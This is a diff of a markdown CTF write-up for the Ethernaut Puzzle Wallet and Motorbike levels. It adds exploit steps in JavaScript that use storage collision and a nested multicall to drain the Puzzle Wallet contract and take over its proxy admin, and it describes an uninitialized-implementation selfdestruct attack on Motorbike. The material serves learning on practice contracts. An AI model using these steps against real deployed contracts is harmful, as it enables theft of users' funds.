@@ -455,12 +455,13 @@ contract Dex2Attacker is ERC20 {
 
 
 ## Puzzle Wallet
-
+Here, we can see in multicall that we are able to call deposit two times. This will increase our balance in contract, and we will be able to drain funds that we didn't deposit.
 ```js
 // get owner of PuzzleWallet (by storage collision with pendingAdmin)
-//// Here '000000000000000000000000address', address needs to be replace by your address without 0x
+// proposeNewAdmin()
+//// Here '000000000000000000000000address', address needs to be replace by your address without 0x. 24 zero (12 bytes) must be set before (encoding of address)
 contract.sendTransaction({value: 0, data: '0xa6376746000000000000000000000000address'})
-// get whitelisted
+// get whitelisted (allowed thanks to storage collision)
 contract.addToWhitelist("0xaddress")
 // build exploit (needs to call deposit two times, so we will have deposited 0.002 eth)
 depositData = await contract.methods["deposit()"].request().then(v => v.data)
@@ -470,6 +471,13 @@ multicallData = await contract.methods["multicall(bytes[])"].request([depositDat
 contract.execute("0xaddress", 2000000000000000, 0x00)
 // set MaxBalance to our address (will collide with the proxy admin address)
 contract.setMaxBalance('0xaddress')
+```
+
+## Motorbike
+Here, our goal is to selfdestruct the engine of the motorbike. The motorbike contract uses delegatecall, and has called the `initialize()` function of the implementation in constructor. But, the implementation has not been initialized. So, as an attacker, we can initialize the implementation and upgrade it to an attacker contract. Then, as it delegatecalls, we are able to selfdestruct the contract.
+
+```solidity
+
 ```
 
 ## Others
